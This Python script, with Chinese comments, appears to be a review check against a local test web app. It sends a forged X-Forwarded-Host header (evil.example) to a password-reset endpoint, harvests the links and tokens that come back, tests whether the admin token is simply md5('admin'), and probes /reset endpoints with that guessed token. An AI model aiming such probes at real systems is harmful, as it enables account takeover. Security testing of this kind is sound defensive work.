# -*- coding: utf-8 -*-
"""mentor 复核 2：/forgot 重置流程现状 + /reset 是否存在（只读，不改任何密码）。"""
import urllib.request, urllib.parse, urllib.error, re, hashlib, json

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None

OP = urllib.request.build_opener(NoRedirect)


def req(path, headers=None, base="http://127.0.0.1:8095"):
    h = dict(headers or {})
    r = urllib.request.Request(base + path, headers=h)
    try:
        resp = OP.open(r, timeout=8)
        return resp.getcode(), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, repr(e)


out = {}
c, b = req("/forgot?username=admin", {"X-Forwarded-Host": "evil.example"})
out["forgot_status"] = c
out["forgot_evil_reflected"] = "evil.example" in b
# 抓出链接/令牌原文
links = re.findall(r"http[s]?://[^\s\"'<>]+", b)
out["forgot_links"] = links[:5]
toks = re.findall(r"token=([A-Za-z0-9_\-\.]+)", b)
out["forgot_tokens"] = toks[:5]
out["md5_user"] = hashlib.md5(b"admin").hexdigest()
out["md5_equals_token"] = (hashlib.md5(b"admin").hexdigest() in toks)

for p in ("/reset", "/reset?user=admin&token=" + hashlib.md5(b"admin").hexdigest(),
          "/reset-password", "/reset?token=x"):
    c, b = req(p)
    out["probe" + p] = {"status": c, "len": len(b), "snippet": re.sub(r"\s+", " ", b[:160])}

# 8095 登录锁定窗口是否 429（确认防护在位，只试 1 次错口令以免触发锁定）
c, b = req("/login")
out["login_page_status"] = c
print(json.dumps(out, ensure_ascii=False, indent=2))
